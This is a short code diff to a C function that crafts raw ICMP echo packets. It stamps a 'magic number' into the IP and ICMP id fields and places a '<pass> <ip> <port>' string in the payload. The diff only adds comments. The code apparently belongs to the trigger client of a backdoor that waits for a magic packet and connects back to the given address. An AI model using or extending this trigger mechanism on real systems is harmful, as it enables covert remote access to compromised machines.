@@ -117,13 +117,14 @@ int icmp(char *srcip, char *dstip, int magic_number, char *data) {
     goto close_socket;
   }
 
+  // copies the data ("<pass> <ip> <port>") to the end of the buffer
   memcpy((buffer + sizeof(struct iphdr) + sizeof(struct icmphdr)), data,
          data_len);
 
   iph->ihl = 5;
   iph->version = 4;
   iph->tos = 0;
-  iph->id = htons(magic_number);
+  iph->id = htons(magic_number);  // set ip id header with the magic_number
   iph->ttl = 255;
   iph->protocol = IPPROTO_ICMP;
   iph->saddr = inet_addr(srcip);
@@ -134,7 +135,8 @@ int icmp(char *srcip, char *dstip, int magic_number, char *data) {
   icmp->type = 8;
   icmp->code = ICMP_ECHO;
   icmp->checksum = 0;
-  icmp->un.echo.id = htons(magic_number);
+  icmp->un.echo.id =
+      htons(magic_number);  // set icmp id header with the magic_number
   icmp->un.echo.sequence = htons(4444);
 
   icmp->checksum =
